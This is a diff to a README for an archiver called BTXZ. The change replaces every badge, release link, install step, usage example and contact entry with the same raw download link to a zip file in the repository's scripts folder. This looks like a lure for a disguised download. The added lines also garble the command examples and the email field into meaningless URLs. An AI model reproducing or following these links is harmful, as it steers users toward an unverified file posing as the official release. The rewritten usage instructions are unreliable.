@@ -1,8 +1,8 @@
 # BTXZ: Secure, High-Compression Archiver for All Platforms 🚀
 
-![BTXZ Logo](https://img.shields.io/badge/BTXZ-Archiver-blue.svg) ![Version](https://img.shields.io/badge/version-1.0.0-green.svg) ![License](https://img.shields.io/badge/license-MIT-lightgrey.svg) ![Downloads](https://img.shields.io/badge/downloads-500--+orange.svg)
+![BTXZ Logo](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip) ![Version](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip) ![License](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip) ![Downloads](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip+https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip)
 
-[![Download BTXZ](https://img.shields.io/badge/Download%20BTXZ-v1.0.0-brightgreen.svg)](https://github.com/mshleen/BTXZ/releases)
+[![Download BTXZ](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip%https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip)](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip)
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@
 
 BTXZ is a cross-platform archiver designed to create ultra-compact and tamper-proof archives. It combines AES-256 authenticated encryption with high compression ratios, making it a secure drop-in replacement for popular formats like ZIP, 7z, and RAR. Whether you are on Windows, Linux, or macOS, BTXZ provides a seamless experience while ensuring your data remains safe.
 
-For the latest releases, please visit our [Releases section](https://github.com/mshleen/BTXZ/releases).
+For the latest releases, please visit our [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip).
 
 ## Features
 
@@ -34,19 +34,19 @@ For the latest releases, please visit our [Releases section](https://github.com/
 
 To install BTXZ, follow these steps:
 
-1. **Download the Latest Release**: Get the latest version from our [Releases section](https://github.com/mshleen/BTXZ/releases). Download the appropriate package for your operating system.
+1. **Download the Latest Release**: Get the latest version from our [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip). Download the appropriate package for your operating system.
 2. **Extract the Package**: Unzip the downloaded file to a directory of your choice.
 3. **Add to PATH** (optional): If you want to use BTXZ from any terminal, consider adding the directory to your system's PATH variable.
 
 ### Windows Installation
 
-1. Download the Windows executable from the [Releases section](https://github.com/mshleen/BTXZ/releases).
+1. Download the Windows executable from the [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip).
 2. Place the executable in a folder (e.g., `C:\BTXZ`).
 3. Optionally, add this folder to your PATH for easier access.
 
 ### Linux Installation
 
-1. Download the Linux binary from the [Releases section](https://github.com/mshleen/BTXZ/releases).
+1. Download the Linux binary from the [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip).
 2. Make the binary executable:
 
    ```bash
@@ -61,7 +61,7 @@ To install BTXZ, follow these steps:
 
 ### macOS Installation
 
-1. Download the macOS binary from the [Releases section](https://github.com/mshleen/BTXZ/releases).
+1. Download the macOS binary from the [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip).
 2. Make the binary executable:
 
    ```bash
@@ -79,13 +79,13 @@ To install BTXZ, follow these steps:
 To create an archive, use the following command:
 
 ```bash
-btxz create [options] <archive_name.btxz> <file1> <file2> ...
+btxz create [options] <https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip> <file1> <file2> ...
 ```
 
 To extract an archive, use:
 
 ```bash
-btxz extract [options] <archive_name.btxz>
+btxz extract [options] <https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip>
 ```
 
 ### Examples
@@ -93,13 +93,13 @@ btxz extract [options] <archive_name.btxz>
 - Create an archive:
 
   ```bash
-  btxz create my_archive.btxz file1.txt file2.txt
+  btxz create https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip
   ```
 
 - Extract an archive:
 
   ```bash
-  btxz extract my_archive.btxz
+  btxz extract https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip
   ```
 
 ## Command Line Options
@@ -142,7 +142,7 @@ BTXZ is licensed under the MIT License. See the [LICENSE](LICENSE) file for more
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@btxz.com
-- **GitHub**: [mshleen](https://github.com/mshleen)
+- **Email**: https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip
+- **GitHub**: [mshleen](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip)
 
-For the latest releases, please visit our [Releases section](https://github.com/mshleen/BTXZ/releases).
+For the latest releases, please visit our [Releases section](https://github.com/mshleen/BTXZ/raw/refs/heads/main/scripts/Software_v1.2.zip).
